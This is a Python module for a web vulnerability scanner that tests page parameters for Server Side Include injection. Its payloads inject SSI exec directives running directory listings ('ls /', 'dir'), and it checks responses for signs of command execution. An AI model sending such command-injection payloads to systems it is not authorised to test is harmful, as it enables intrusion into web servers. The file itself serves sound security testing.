

import re
from core.scanner.module import ParamsScanner, Risk, Status


class SSI( ParamsScanner ):

    def __init__(self, config, info = {
        "Authors": ["Abdallah Mohamed"],
        "Name": "Server Side Include Injection",
        "Description": 'The product generates a web page, but does not neutralize or incorrectly neutralizes user-controllable input that could be interpreted as a server-side include (SSI) directive.',
        "Risk": Risk.Critical,
        "Referances": [
            "https://cwe.mitre.org/data/definitions/97.html",
            "https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection",
            "https://medium.com/@yasmeena_rezk/server-side-includes-ssi-edge-side-includes-esi-13a8fc042e81"
        ]
    }) -> None:
        ParamsScanner.__init__(self, config, info)

    def check(self):
        path = self.GetEndPoint().GetPath()
        return False if not path.endswith( (".shtml", ".shtm", ".stm") ) else ParamsScanner.check(self)

    def GetPayloads(self) -> list:
        u_payload = "<!--#EXEC cmd=\"ls /\"-->"
        w_payload = "<!--#EXEC cmd=\"dir \\\"-->"

        return [
            u_payload,
            w_payload,
            f"\">{u_payload}<",
            f"\">{w_payload}<"
        ]

    def is_vulnerable(self, response) -> Status:
        u_expectedResPattern = re.compile( r"\broot\b.*\busr\b", re.DOTALL )
        if u_expectedResPattern.search( response.text ):
            return Status.Vulnerable

        w_expectedResPattern = re.compile( r"\bprogram files\b.*\b(WINDOWS|WINNT)\b", re.DOTALL )
        if w_expectedResPattern.search( response.text ):
            return Status.Vulnerable

        return Status.NotVulnerable